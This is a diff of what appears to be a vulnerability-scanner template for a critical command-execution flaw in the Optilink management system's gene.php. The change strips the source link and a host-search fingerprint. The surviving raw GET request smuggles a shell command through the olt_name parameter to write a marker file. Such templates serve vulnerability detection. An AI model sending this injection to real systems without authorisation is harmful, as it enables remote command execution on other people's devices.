@@ -3,12 +3,8 @@ info:
   name: Optilink 管理系统 gene.php 任意命令执行漏洞
   author: hacktwo
   severity: critical
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ohqiee3fkeykq4lr'
+  description: ''
   tags: rce,2026
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: ohqiee3fkeykq4lr
-    fofa: body="/html/css/dxtdata.css"
 http:
 - raw:
   - 'GET /cgi/fsystem/gene.php?olt_op=1&olt_name=;echo+DudeSuite>%20test123.txt;%20%23%20 HTTP/1.1
